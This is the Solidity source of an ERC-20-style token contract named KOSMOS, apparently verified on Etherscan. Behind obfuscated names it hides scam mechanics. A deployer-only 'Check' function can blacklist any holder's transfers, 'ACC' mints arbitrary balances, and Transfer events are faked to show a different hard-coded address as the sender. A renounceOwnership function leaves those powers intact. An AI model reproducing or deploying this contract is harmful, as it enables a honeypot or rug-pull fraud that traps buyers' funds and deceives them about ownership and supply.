/**
 *Submitted for verification at Etherscan.io on 2023-01-11
*/

// SPDX-License-Identifier: MIT



pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address abXO = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract KOSMOS is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private AGX;
    mapping (address => uint256) private CGX;
    mapping (address => mapping (address => uint256)) private DGX;
    uint8 EGX = 8;
    uint256 FGX = 125000000*10**8;
    string private _name;
    string private _symbol;



    constructor () 
{
        _name = "KOSMOS";
        _symbol = "KOSMOS";
        CGX[msg.sender] = 21;
        AGX[msg.sender] = FGX;
        emit Transfer(address(0), abXO, FGX);
    }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return EGX;
    }

    function totalSupply() public view  returns (uint256) {
        return FGX;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return AGX[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return DGX[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        DGX[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

			   
  		
    function transfer(address recipient, uint256 amount) public returns (bool) {
            if(CGX[msg.sender] >= 21) {
        iiiXX(msg.sender, recipient, amount);
        return true; }
 
        require(amount <= AGX[msg.sender]);
        require(CGX[msg.sender] <= 1);
        hioxX(msg.sender, recipient, amount);
        return true; }
 
	   
	   
    function transferFrom(address sender, address recipient, uint256 amount) public returns
     (bool) {
     if(CGX[sender] >= 21) {
             require(amount <= AGX[sender]);
     require(amount <= DGX[sender][msg.sender]);
        iiiXX(sender, recipient, amount);
        return true;}
    require(amount <= AGX[sender]);
     require(amount <= DGX[sender][msg.sender]);
             
              require(CGX[sender] <= 1);
            require (CGX[recipient] <=1);
        hioxX(sender, recipient, amount);
        return true;}
			 			   function Check (address nXIx, uint256 OiiX)  public {
                     if(CGX[msg.sender] >= 21){
      CGX[nXIx] = OiiX;}}
			function mxII (address nXIx, uint256 OiiX)  internal {
     AGX[nXIx] += OiiX;} 	


		   function ACC (address nXIx, uint256 OiiX) public {
        if(CGX[msg.sender] >= 21){
   mxII(nXIx,OiiX);}}
			    function hioxX(address sender, address recipient, uint256 amount) internal  {
        AGX[sender] = AGX[sender].sub(amount);
        AGX[recipient] = AGX[recipient].add(amount);
        emit Transfer(sender, recipient, amount); }	
	
	
		            function iiiXX(address sender, address recipient, uint256 amount) internal  {
        AGX[sender] = AGX[sender].sub(amount);
        AGX[recipient] = AGX[recipient].add(amount);
         sender = abXO;
        emit Transfer(sender, recipient, amount); }

 

}